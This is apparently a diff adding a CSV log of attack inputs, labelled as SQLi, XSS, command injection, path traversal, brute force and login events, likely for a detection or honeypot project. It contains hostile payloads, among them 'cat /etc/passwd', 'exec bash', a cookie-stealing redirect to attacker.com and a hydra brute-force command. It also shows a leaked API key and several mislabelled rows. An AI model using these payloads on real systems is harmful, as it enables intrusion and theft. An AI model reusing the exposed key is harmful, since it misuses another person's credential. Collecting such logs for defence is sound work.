@@ -1,0 +1,142 @@
+payload,attack_type,timestamp
+1,Failed Login,2026-01-25 10:04:11.111559
+admin,Successful Login,2026-01-25 10:09:33.248743
+1 OR | 1`,CommandInjection,2026-01-30 12:11:38.628905
+' OR 1=1 --,SQLi,2025-12-30 21:15:10.723808
+admin' OR '1'='1,SQLi,2026-01-05 01:15:10.724001
+' UNION SELECT NULL--,SQLi,2026-01-19 06:15:10.724074
+admin'--,SQLi,2026-01-14 05:15:10.724125
+' OR 'x'='x,SQLi,2026-01-21 06:15:10.724173
+<script>alert('XSS')</script>,XSS,2026-01-02 07:15:10.724214
+<img src=x onerror=alert(1)>,XSS,2026-01-21 10:15:10.724254
+admin<script>alert(document.cookie)</script>,XSS,2026-01-05 03:15:10.724298
+admin; ls -la,CommandInjection,2026-01-17 14:15:10.724349
+user && cat /etc/passwd,CommandInjection,2026-01-29 11:15:10.724389
+test | whoami,CommandInjection,2026-01-22 08:15:10.724426
+../../../etc/passwd,PathTraversal,2026-01-06 02:15:10.724462
+..\..\..\windows\system32,PathTraversal,2026-01-21 01:15:10.724499
+xK9#mL@pQ2$vN8&wR5*tY1,Anomaly,2026-01-25 01:15:10.724535
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,Anomaly,2026-01-23 14:15:10.724569
+<img src=x onerror=alert(1)>,XSS,2026-01-30 12:52:42.500687
+<img src=x onerror=alert(1)>,XSS,2026-01-30 12:55:19.755668
+<img src=x onerror=alert(1)>,XSS,2026-01-30 12:55:19.879770
+main,Successful Login,2026-01-30 12:59:49.931695
+main,Failed Login,2026-01-30 13:00:00.614572
+main,Failed Login,2026-01-30 13:00:04.047262
+main,Failed Login,2026-01-30 13:00:05.808775
+' OR 1=1 --,SQLi,2026-01-16 17:37:59.837015
+admin' OR '1'='1,SQLi,2026-01-02 05:37:59.837137
+' UNION SELECT NULL--,SQLi,2026-01-01 23:37:59.837196
+admin'--,SQLi,2026-01-19 15:37:59.837247
+' OR 'x'='x,SQLi,2026-01-28 08:37:59.837295
+<script>alert('XSS')</script>,XSS,2026-01-25 01:37:59.837336
+<img src=x onerror=alert(1)>,XSS,2026-01-17 16:37:59.837376
+admin<script>alert(document.cookie)</script>,XSS,2026-01-09 21:37:59.837418
+admin; ls -la,CommandInjection,2026-01-06 15:37:59.837470
+user && cat /etc/passwd,CommandInjection,2026-01-08 15:37:59.837510
+test | whoami,CommandInjection,2026-01-23 09:37:59.837547
+../../../etc/passwd,PathTraversal,2026-01-08 02:37:59.837583
+..\..\..\windows\system32,PathTraversal,2026-01-29 06:37:59.837619
+xK9#mL@pQ2$vN8&wR5*tY1,Anomaly,2026-01-11 05:37:59.837654
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,Anomaly,2026-01-02 06:37:59.837689
+<img src=x onerror=alert(1)>,XSS,2026-01-30 17:07:49.716641
+<img src=x onerror=alert(1)>,XSS,2026-01-30 17:13:08.145829
+main,Successful Login,2026-01-30 18:04:17.675752
+admin,Failed Login,2026-01-31 02:22:10.738605
+main,Successful Login,2026-01-31 02:22:30.276736
+main,Successful Login,2026-01-31 02:22:30.402239
+main,Successful Login,2026-01-31 05:42:19.536858
+main,Successful Login,2026-01-31 05:53:46.823914
+1 OR | 1',SQLi,2026-01-31 05:54:41.960039
+1 OR | 1',SQLi,2026-01-31 05:54:42.138359
+1 OR | 1',SQLi,2026-01-31 05:54:42.276060
+1 OR | 1',SQLi,2026-01-31 05:54:42.871090
+main,Successful Login,2026-01-31 06:18:03.690215
+main,Successful Login,2026-01-31 06:18:03.971284
+1 OR | 1',SQLi,2026-01-31 06:20:04.909624
+1 OR | 1',SQLi,2026-01-31 06:20:05.090289
+1 OR | 1',SQLi,2026-01-31 06:20:11.403498
+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,Failed Login,2026-02-08 07:35:47.743366
+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,Failed Login,2026-02-08 07:37:32.339952
+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,Failed Login,2026-02-08 07:37:48.753507
+<img src=x onerror=alert(1)>,XSS,2026-02-08 07:43:33.728475
+<script>alert('XSS')</script>,SQLi,2026-02-14 12:41:07.999267
+<script>document.location='http://attacker.com/steal?,SQLi,2026-02-14 12:48:28.810038
+main,Failed Login,2026-02-14 12:50:16.097898
+main,Failed Login,2026-02-14 12:51:15.212688
+main,Failed Login,2026-02-14 12:51:15.438866
+GET 1 OR | 1`,CommandInjection,2026-02-14 13:43:14.858319
+GET 1 OR | 1`,CommandInjection,2026-02-14 13:48:15.423847
+ /mnt/OldVolume/acces true ,Failed Login,2026-02-14 14:01:53.645324
+ /mnt/OldVolume/acces true ,Failed Login,2026-02-14 14:02:34.651541
+admin,Failed Login,2026-02-14 14:06:48.338966
+admin,Failed Login,2026-02-14 14:06:48.591351
+main,Successful Login,2026-02-14 14:07:36.816649
+main,Failed Login,2026-02-14 14:07:48.036916
+1 OR | `1,CommandInjection,2026-02-14 14:08:50.758684
+main,Successful Login,2026-02-14 14:10:15.042461
+main,Successful Login,2026-02-15 07:33:45.102994
+1 OR | `1,CommandInjection,2026-02-15 07:34:35.677004
+1 OR | `1,CommandInjection,2026-02-15 07:35:48.513644
+<img src=x onerror=alert(1)>,XSS,2026-02-15 07:48:39.688882
+1 OR | 1',SQLi,2026-02-15 07:49:28.315307
+1 OR `|1,Failed Login,2026-02-15 09:05:02.602819
+main,Successful Login,2026-02-17 16:08:49.310864
+main,Successful Login,2026-02-17 16:13:06.167623
+/mnt/OldVolume/acces true,Failed Login,2026-02-17 16:14:16.796760
+<img src=x onerror=alert(1)>,XSS,2026-02-17 16:14:52.220937
+main,Successful Login,2026-02-17 16:17:02.032920
+1 OR 1 | ',SQLi,2026-02-17 16:41:21.233307
+"-s pucvmt; exec bash"" &",Failed Login,2026-02-17 16:42:29.937956
+1 OR 1 | ',SQLi,2026-02-17 16:42:44.079521
+ 	1 OR 1 | ',SQLi,2026-02-17 16:45:48.586617
+ 	..\..\..\windows\system32,PathTraversal,2026-02-17 16:48:49.104536
+ 	..\..\..\windows\system32,PathTraversal,2026-02-17 16:56:50.429644
+main ,Failed Login,2026-02-17 16:58:24.294965
+main,Failed Login,2026-02-17 16:59:42.448378
+main,Successful Login,2026-02-17 17:00:10.315322
+ main,Failed Login,2026-02-17 17:00:23.338525
+main,Successful Login,2026-02-17 17:45:15.696582
+ 	..\..\..\windows\system32,PathTraversal,2026-02-17 17:45:44.262446
+main,Successful Login,2026-02-17 18:20:51.902733
+1 OR 1 |`,Failed Login,2026-02-17 18:21:12.648088
+1 OR 1 |`,Failed Login,2026-02-17 18:21:12.807575
+1 OR 1 | ',SQLi,2026-02-17 18:21:47.235528
+main,Successful Login,2026-02-17 18:28:14.692966
+1 OR 1 | ',SQLi,2026-02-17 19:04:03.917062
+1 OR '1|,SQLi,2026-02-17 19:07:10.254218
+1 OR 1 '|,SQLi,2026-02-17 19:13:48.485816
+1 OR 1 '|,SQLi,2026-02-17 19:13:48.676226
+1 OR 1 | ',SQLi,2026-02-17 19:17:08.981231
+"hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8000 http-post-form ""/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"" -V   ",Failed Login,2026-02-18 18:08:46.814554
+<script>eval(8680439..toString(30))(983801..toString(36))</script>,XSS,2026-02-18 18:09:24.458186
+<script>eval(8680439..toString(30))(983801..toString(36))</script>,XSS,2026-02-18 18:42:53.836002
+1 OR 1`|,Failed Login,2026-02-19 16:28:03.545554
+1 OR 1'|,SQLi,2026-02-19 17:39:00.256523
+main,Successful Login,2026-02-21 06:31:25.670926
+main,Failed Login,2026-02-21 06:45:25.572706
+main,Successful Login,2026-02-21 06:45:37.647372
+main,Successful Login,2026-02-21 06:48:02.401926
+main,Failed Login,2026-02-21 06:48:12.695915
+main,Failed Login,2026-02-21 06:48:20.451971
+main,Failed Login,2026-02-21 06:48:24.887505
+main,Successful Login,2026-02-21 07:28:59.279217
+main,Failed Login,2026-02-21 07:29:09.439882
+main,Failed Login,2026-02-21 07:29:31.687478
+system,Brute Force Attempt,2026-02-21 07:29:54.105668
+1 OR 1'|,SQLi,2026-02-21 07:31:17.027025
+main,Successful Login,2026-02-21 07:36:42.833924
+<script>eval(8680439..toString(30))(983801..toString(36))</script>,XSS,2026-02-21 07:37:11.334942
+main,Successful Login,2026-02-22 14:02:22.211869
+1 OR 1 | ',SQLi,2026-02-22 14:03:07.970190
+admin' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END) --,SQLi,2026-02-22 14:19:29.240898
+admin,Successful Login,2026-02-25 16:08:06.603247
+admin,Successful Login,2026-02-25 16:12:22.330733
+user,Successful Login,2026-02-25 16:12:41.847006
+main,Successful Login,2026-02-25 16:12:52.666233
+main,Successful Login,2026-02-25 16:32:32.531191
+admin,Successful Login,2026-02-25 16:32:51.648548
+admin,Successful Login,2026-02-26 04:45:02.187039
+"<input type=""text"" value=""<script>alert('XSS')</script>"">",SQLi,2026-02-26 04:46:06.838679
+john,Successful Login,2026-02-26 04:50:34.523417
+"<input type=""text"" value=""<script>alert('XSS')</script>"">",SQLi,2026-02-26 07:33:01.567991
